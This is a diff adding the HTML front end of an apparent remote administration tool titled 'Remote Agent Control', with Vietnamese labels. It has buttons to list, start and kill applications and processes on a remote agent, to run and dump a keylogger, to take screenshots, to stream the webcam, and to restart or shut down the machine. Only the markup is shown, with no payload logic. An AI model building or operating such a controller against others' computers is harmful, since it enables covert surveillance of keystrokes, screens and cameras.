@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Remote Agent Control</title>
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <!-- Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <header class="topbar">
+        <h1>🖥 Remote Agent Control</h1>
+        <div class="status disconnected" id="status">Disconnected</div>
+    </header>
+
+    <main class="master-detail-layout">
+
+        <!-- SIDEBAR -->
+        <aside class="sidebar">
+            <h2>☰ Chức năng</h2>
+
+            <button class="menu-btn active" onclick="switchTab('app')">
+                <i class="fa-solid fa-gears"></i> Application Control
+            </button>
+
+            <button class="menu-btn" onclick="switchTab('process')">
+                <i class="fa-solid fa-microchip"></i> Process Control
+            </button>
+
+            <button class="menu-btn" onclick="switchTab('keylogger')">
+                <i class="fa-solid fa-keyboard"></i> Keylogger
+            </button>
+
+            <button class="menu-btn" onclick="switchTab('screenshot')">
+                <i class="fa-solid fa-camera"></i> Screenshot
+            </button>
+
+            <button class="menu-btn" onclick="switchTab('webcam')">
+                <i class="fa-solid fa-video"></i> Webcam
+            </button>
+
+            <button class="menu-btn" onclick="switchTab('system')">
+                <i class="fa-solid fa-power-off"></i> System Control
+            </button>
+
+            <button class="menu-btn danger">
+                <i class="fa-solid fa-triangle-exclamation"></i> Disconnect
+            </button>
+        </aside>
+
+        <!-- CONTENT -->
+        <section class="content-area">
+
+            <!-- APP CONTROL -->
+            <div id="app" class="content-view active">
+                <h2>⚙ Application Control</h2>
+
+                <div class="app-control-grid">
+
+                    <!-- LEFT: Control -->
+                    <div class="control-box">
+                        <h3>List Application</h3>
+                        <button class="btn btn-primary full-width" onclick="listApp()">📋 List Application</button>
+                        <h3>Start Application</h3>
+                        <button class="btn btn-primary full-width" onclick="startApp()">▶ Start Application</button>
+                        <h3>Stop Application</h3>
+                        <button class="btn btn-danger full-width stop-btn" onclick="stopApp()">⛔ Stop</button>
+                    </div>
+
+                    <!-- MIDDLE: Application List -->
+                    <div class="control-box">
+                        <h3>📋 Application List</h3>
+                        <!-- Application List -->
+                        <pre id="appList" class="log-box"></pre>
+
+                        <!-- Application Log -->
+                        <pre id="appLog" class="log-box"></pre>
+                    </div>
+                </div>
+            </div>
+            <!-- PROCESS CONTROL -->
+            <div id="process" class="content-view">
+                <h2>🧠 Process Control</h2>
+
+                <div class="app-control-grid">
+
+                    <!-- LEFT: Control -->
+                    <div class="control-box">
+                        <h3>List Process</h3>
+                        <button class="btn btn-primary full-width" onclick="listProc()">📋 List Process</button>
+                        <h3>Stop Process</h3>
+                        <div class="stop-group">
+                            <!-- <input id="stopAppInput"
+                                type="text"
+                                placeholder="VD: chrome.exe hoặc PID"> -->
+
+                            <button class="btn btn-danger full-width stop-btn"
+                                    onclick="stopProc()">⛔ Stop</button>
+                        </div>
+                    </div>
+
+                    <!-- MIDDLE: Process List -->
+                    <div class="control-box">
+                        <h3>📋 Process List</h3>
+                        <!-- Process List -->
+                        <pre id="procList" class="log-box"></pre>
+
+                        <!-- Process Log -->
+                        <pre id="procLog" class="log-box"></pre>
+                    </div>
+                </div>
+            </div>
+
+            <!-- KEYLOGGER -->
+        <div id="keylogger" class="content-view">
+            <h2>⌨ Keylogger</h2>
+
+            <div class="app-control-grid">
+                <!-- CONTROL -->
+                <div class="control-box">
+                    <h3>KEYLOGGER CONTROL</h3>
+
+                    <button class="btn btn-success full-width" onclick="startKeylogger()">
+                        ▶ Start Keylogger
+                    </button>
+
+                    <button class="btn btn-danger full-width" style="margin-top:10px;" onclick="stopKeylogger()">
+                        ⛔ Stop Keylogger
+                    </button>
+
+                    <button class="btn btn-primary full-width" style="margin-top:10px;" onclick="getKeylog()">
+                        📤 Dump Keylog
+                    </button>
+                </div>
+
+                <!-- LOG -->
+                <div class="control-box">
+                    <h3>KEYLOG OUTPUT</h3>
+
+                    <div id="keylog_output" class="log-container">
+                        <pre class="log-output">
+                        </pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+            <!-- SCREENSHOT -->
+            <div id="screenshot" class="content-view">
+                <h2>📸 Screenshot</h2>
+                <div class="media-viewer">
+                    <img id="screenshotImg" style="max-width:100%; max-height:100%; display:none;">
+                </div>
+                <button class="btn btn-primary full-width" onclick="Screenshoot()">Capture</button>
+            </div>
+
+            <!-- WEBCAM -->
+            <div id="webcam" class="content-view">
+                <h2>🎥 Webcam</h2>
+                <div class="webcam-actions">
+                    <button class="btn btn-primary full-width" onclick="startWebcam()">
+                        Start Webcam
+                    </button>
+
+                   <video id="videoPlayer" controls></video>
+                </div>
+            </div>
+
+            <!-- SYSTEM -->
+            <div id="system" class="content-view">
+                <h2>⚠ System Control</h2>
+
+                <button class="btn btn-danger large-btn" onclick="restart()">Restart</button>
+                <button class="btn btn-danger large-btn" onclick="shutdown()">Shutdown</button>
+            </div>
+
+        </section>
+    </main>
+    <pre id="log"></pre>
+
+    <script src="js/websocket.js"></script>
+    <script src="js/ui.js"></script>
+    <script src="js/command.js"></script>
+
+</body>
+</html>
